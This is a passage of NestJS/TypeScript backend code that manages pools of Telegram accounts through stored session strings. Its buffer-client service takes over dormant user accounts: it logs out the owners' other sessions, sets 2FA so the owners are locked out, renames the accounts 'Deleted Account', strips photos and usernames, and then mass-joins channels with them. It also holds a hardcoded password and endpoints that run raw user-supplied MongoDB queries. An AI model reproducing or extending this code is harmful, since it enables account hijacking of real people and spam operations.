'🆒',\n      '🗿', '🙉', '🙊', '🤷', '👎'\n    ]\n  })\n  reactions?: string[] = [\n    '❤', '🔥', '👏', '🥰', '😁', '🤔',\n    '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n    '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n    '🤣', '💔', '🏆', '😭', '😴', '👍',\n    '🌚', '⚡', '🍌', '😐', '💋', '👻',\n    '👀', '🙈', '🤝', '🤗', '🆒',\n    '🗿', '🙉', '🙊', '🤷', '👎'\n  ];\n\n  @ApiProperty({ default: false })\n  banned?: boolean = false;\n\n  @ApiProperty({ default: true, required: false })\n  megagroup?: boolean;\n\n  @ApiProperty({ default: false, required: false })\n  forbidden?: boolean\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n}\n","// src/activechannels/dto/update-activechannel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateActiveChannelDto } from './create-active-channel.dto';\n\nexport class UpdateActiveChannelDto extends PartialType(CreateActiveChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { defaultMessages, defaultReactions } from '../../../utils';\n\nexport type ActiveChannelDocument = ActiveChannel & Document;\n\n@Schema({ collection: 'activeChannels', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n })\nexport class ActiveChannel {\n  @ApiProperty({ required: true })\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @ApiProperty({ required: true })\n  @Prop({ required: true })\n  title: string;\n\n  @ApiProperty({ required: false, default: null })\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  wordRestriction: number;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  dMRestriction: number;\n\n  @ApiProperty({ type: [String], default:defaultMessages })\n  @Prop({ type: [String], default: defaultMessages })\n  availableMsgs: string[];\n\n  @ApiProperty({ type: [String], default: defaultReactions })\n  @Prop({\n    type: [String], default: defaultReactions\n  })\n  reactions: string[];\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  banned: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  megagroup: boolean;\n\n  @ApiProperty({ default: false})\n  @Prop({ default: false })\n  private: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  reactRestricted: boolean\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  forbidden: boolean\n}\n\nexport const ActiveChannelSchema = SchemaFactory.createForClass(ActiveChannel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { Client } from '../clients/schemas/client.schema';\nimport { ArchivedClientService } from './archived-client.service';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { SearchClientDto } from '../clients/dto/search-client.dto';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\n\n@ApiTags('Archived Clients')\n@Controller('archived-clients')\nexport class ArchivedClientController {\n  constructor(private readonly archivedclientService: ArchivedClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  //@apiresponse({ status: 201, description: 'The user data has been successfully created.' })\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\n    return this.archivedclientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  //@apiresponse({ status: 200, description: 'Return the searched user data.' })\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\n    return this.archivedclientService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  //@apiresponse({ status: 200, description: 'Return all user data.' })\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\n  async findAll(): Promise<Client[]> {\n    return this.archivedclientService.findAll();\n  }\n  \n  @Get('checkArchivedClients')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async checkArchivedClients(): Promise<string> {\n    return this.archivedclientService.checkArchivedClients();\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async findOne(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.findOne(mobile);\n  }\n  \n  @Get('fetchOne/:mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async fetchOne(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.fetchOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  //@apiresponse({ status: 200, description: 'The user data has been successfully updated.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\n    return this.archivedclientService.update(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  //@apiresponse({ status: 200, description: 'The user data has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async remove(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  //@apiresponse({ status: 200, description: 'Query executed successfully.' })\n  //@apiresponse({ status: 400, description: 'Invalid query.' })\n  //@apiresponse({ status: 500, description: 'Internal server error.' })\n  @ApiBody({type: Object})\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.archivedclientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ClientSchema } from '../clients/schemas/client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ArchivedClientService } from './archived-client.service';\nimport { ArchivedClientController } from './archived-client.controller';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ collection: 'ArchivedClients', name: 'ArchivedArchivedClientsModule', schema: ClientSchema }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [ArchivedClientController],\n  providers: [ArchivedClientService],\n  exports: [ArchivedClientService]\n})\nexport class ArchivedClientModule { }\n","import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { Client, ClientDocument } from '../clients/schemas/client.schema';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { ClientService } from '../clients/client.service';\nimport { parseError } from '../../utils/parseError';\n@Injectable()\nexport class ArchivedClientService {\n    constructor(@InjectModel('ArchivedArchivedClientsModule') private archivedclientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n    ) { }\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.archivedclientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const results: Client[] = await this.archivedclientModel.find().exec();\n        return results\n    }\n\n    async findOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        return user;\n    }\n\n    async fetchOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        if (user) {\n            return user;\n        } else {\n            try {\n                await this.telegramService.createClient(mobile, false, true)\n                const newSession = await this.telegramService.createNewSession(mobile);\n                await this.telegramService.deleteClient(mobile)\n                return await this.create({\n                    \"channelLink\": \"default\",\n                    \"clientId\": \"default\",\n                    \"dbcoll\": \"default\",\n                    \"deployKey\": \"default\",\n                    \"link\": \"default\",\n                    \"mainAccount\": \"default\",\n                    promoteRepl: \"default\",\n                    \"name\": \"default\",\n                    \"password\": \"Ajtdmwajt1@\",\n                    \"repl\": \"default\",\n                    \"session\": newSession,\n                    \"username\": \"default\",\n                    \"mobile\": mobile,\n                    product: \"default\"\n                })\n            } catch (e) {\n                await this.telegramService.deleteClient(mobile)\n                throw new NotFoundException(parseError(e).message);\n            }\n        }\n    }\n\n    async update(mobile: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto[\"_id\"]\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        console.log({ ...updateClientDto });\n        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        return updatedUser;\n    }\n\n    async remove(mobile: string): Promise<Client> {\n        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${mobile}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.archivedclientModel.find(filter).exec();\n    }\n\n    async checkArchivedClients() {\n        await this.telegramService.disconnectAll()\n        await sleep(2000);\n        const archivedClients = await this.findAll();\n\n        const clients = await this.clientService.findAll();\n        const clientIds = clients.map(client => client.mobile);\n\n        archivedClients.map(async (document) => {\n            if (!clientIds.includes(document.mobile)) {\n                try {\n                    await this.telegramService.createClient(document.mobile, true, false);\n                    await this.telegramService.updateUsername(document.mobile, '');\n                    await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                    await this.telegramService.deleteClient(document.mobile)\n                    await sleep(2000);\n                } catch (error) {\n                    console.log(document.mobile, \" :  false\");\n                    this.remove(document.mobile)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } else {\n                console.log(\"Number is a Active Client\")\n            }\n        })\n\n        return \"Triggered ArchiveClients check\"\n    }\n\n    async executeQuery(query: any): Promise<any> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            return await this.archivedclientModel.find(query).exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n}\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\nimport { BufferClientService } from './buffer-client.service';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { SearchBufferClientDto } from './dto/search-buffer- client.dto';\nimport { BufferClient } from './schemas/buffer-client.schema';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\n\n@ApiTags('Buffer Clients')\n@Controller('bufferclients')\nexport class BufferClientController {\n  constructor(private readonly clientService: BufferClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchBufferClientDto): Promise<BufferClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForBufferClients')\n  @ApiOperation({ summary: 'Join Channels for BufferClients' })\n  async joinChannelsforBufferClients(): Promise<string> {\n    return this.clientService.joinchannelForBufferClients();\n  }\n\n  @Get('checkBufferClients')\n  @ApiOperation({ summary: 'Check Buffer Clients' })\n  async checkbufferClients(): Promise<string> {\n    this.clientService.checkBufferClients();\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoBufferClients')\n  @ApiOperation({ summary: 'Add New Users to Buffer Clients' })\n  @ApiBody({ type: Object })\n  async addNewUserstoBufferClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\n    this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<BufferClient[]> {\n    return this.clientService.findAll();\n  }\n\n  @Get('SetAsBufferClient/:mobile')\n  @ApiOperation({ summary: 'Set as Buffer Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsBufferClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsBufferClient(mobile);\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<BufferClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BufferClientService } from './buffer-client.service';\nimport { BufferClientController } from './buffer-client.controller';\nimport { BufferClientSchema } from './schemas/buffer-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'bufferClientModule', schema: BufferClientSchema, collection: 'bufferClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => PromoteClientModule)\n ],\n  controllers: [BufferClientController],\n  providers: [BufferClientService],\n  exports: [BufferClientService]\n})\nexport class BufferClientModule { }\n","import { ChannelsService } from './../channels/channels.service';\nimport { Channel } from './../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\nimport { PromoteClientService } from '../promote-clients/promote-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n@Injectable()\nexport class BufferClientService {\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => PromoteClientService))\n        private promoteClientService: PromoteClientService,\n    ) { }\n\n    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {\n        const newUser = new this.bufferClientModel(bufferClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<BufferClient[]> {\n        return this.bufferClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClient> {\n        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n        const updatedUser = await this.bufferClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {\n        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreateBufferClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);\n        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<BufferClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.bufferClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<BufferClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.bufferClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromBufferMap(key: string) {\n        this.joinChannelMap.delete(key)\n    }\n    clearBufferMap() {\n        console.log(\"BufferMap cleared\")\n        this.joinChannelMap.clear()\n    }\n\n    async joinchannelForBufferClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            console.log(\"Joining Channel Started\")\n            await this.telegramService.disconnectAll();\n            this.clearJoinChannelInterval();\n            await sleep(2000);\n            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\n            // const today = (new Date(Date.now())).toISOString().split('T')[0];\n            const clients = await this.bufferClientModel.find({ channels: { \"$lt\": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\n            if (clients.length > 0) {\n                for (const document of clients) {\n                    try {\n                        const client = await this.telegramService.createClient(document.mobile, false, false);\n                        console.log(\"Started Joining for : \", document.mobile)\n                        const channels = await client.channelInfo(true);\n                        console.log(\"Existing Channels Length : \", channels.ids.length);\n                        await this.update(document.mobile, { channels: channels.ids.length });\n                        let result = [];\n                        if (channels.canSendFalseCount < 50) {\n                            if (channels.ids.length < 220) {\n                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                            } else {\n                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                            }\n                            this.joinChannelMap.set(document.mobile, result);\n                            await this.telegramService.deleteClient(document.mobile);\n                        } else {\n                            client.leaveChannels(channels.canSendFalseChats)\n                        }\n                        // console.log(\"DbChannelsLen: \", result.length);\n                        // let resp = '';\n                        // this.telegramService.joinChannels(document.mobile, result);\n                    } catch (error) {\n                        if (error.message === \"SESSION_REVOKED\" ||\n                            error.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            error.message === \"USER_DEACTIVATED\" ||\n                            error.message === \"USER_DEACTIVATED_BAN\") {\n                            console.log(\"Session Revoked or Auth Key Unregistered. Removing Client\");\n                            await this.remove(document.mobile);\n                            await this.telegramService.deleteClient(document.mobile);\n                        }\n                        parseError(error)\n                    }\n                }\n                this.joinChannelQueue();\n            }\n            console.log(\"Joining Channel Triggered Succesfully for \", clients.length);\n            return `Initiated Joining channels ${clients.length}`\n        } else {\n            console.log(\"ignored active check buffer channels as active client setup exists\")\n        }\n    }\n\n    async joinChannelQueue() {\n        const existingkeys = Array.from(this.joinChannelMap.keys())\n        if (existingkeys.length > 0) {\n            this.joinChannelIntervalId = setInterval(async () => {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length > 0) {\n                    console.log(\"In JOIN CHANNEL interval: \", new Date().toISOString());\n                    for (const mobile of keys) {\n                        const channels = this.joinChannelMap.get(mobile);\n                        if (channels && channels.length > 0) {\n                            const channel = channels.shift();\n                            console.log(mobile, \" Pending Channels :\", channels.length)\n                            this.joinChannelMap.set(mobile, channels);\n                            try {\n                                await this.telegramService.createClient(mobile, false, false);\n                                console.log(mobile, \" Trying to join :\", channel.username);\n                                await this.telegramService.tryJoiningChannel(mobile, channel);\n                            } catch (error) {\n                                await this.telegramService.deleteClient(mobile);\n                                const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `, false);\n                                if (error.errorMessage == 'CHANNELS_TOO_MUCH' || errorDetails.error == 'FloodWaitError') {\n                                    this.removeFromBufferMap(mobile)\n                                    const channels = await this.telegramService.getChannelInfo(mobile, true);\n                                    // await this.update(mobile, { channels: channels.ids.length });\n                                }\n                            }\n                            await this.telegramService.deleteClient(mobile);\n                        } else {\n                            this.joinChannelMap.delete(mobile);\n                        }\n                    }\n                } else {\n                    this.clearJoinChannelInterval()\n                }\n            }, 4 * 60 * 1000);\n        }\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            setTimeout(() => {\n                this.joinchannelForBufferClients(false)\n            }, 30000);\n        }\n    }\n\n    async setAsBufferClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('BufferClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {\n            try {\n                const telegramClient = await this.telegramService.createClient(mobile, false)\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                // await sleep(3000)\n                // await telegramClient.deleteProfilePhotos();\n                // const channels = await this.telegramService.getChannelInfo(mobile, true)\n                // const bufferClient = {\n                //     tgId: user.tgId,\n                //     session: user.session,\n                //     mobile: user.mobile,\n                //     availableDate,\n                //     channels: channels.ids.length,\n                // }\n                // await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, errorDetails.status)\n            }\n            await this.telegramService.deleteClient(mobile)\n            return \"Client set as buffer successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkBufferClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await this.telegramService.disconnectAll()\n            await sleep(2000);\n            const bufferclients = await this.findAll();\n            let goodIds: string[] = [];\n            let badIds: string[] = [];\n            if (bufferclients.length < 70) {\n                for (let i = 0; i < 70 - bufferclients.length; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const promoteclients = await this.promoteClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const promoteclientIds = promoteclients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of bufferclients) {\n                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000)\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n                            await sleep(2000)\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.bufferClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await this.telegramService.deleteClient(document.mobile)\n                        await sleep(2000);\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile)\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...promoteclientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoBufferClients(badIds, goodIds);\n        } else {\n            console.log(\"ignored active check buffer channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New buffer documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await this.telegramService.createClient(document.mobile, false);\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        await sleep(2000);\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const bufferClient = {\n                            tgId: document.tgId,\n                            session: document.session,\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(bufferClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created BufferClient=============\")\n                        await this.telegramService.deleteClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        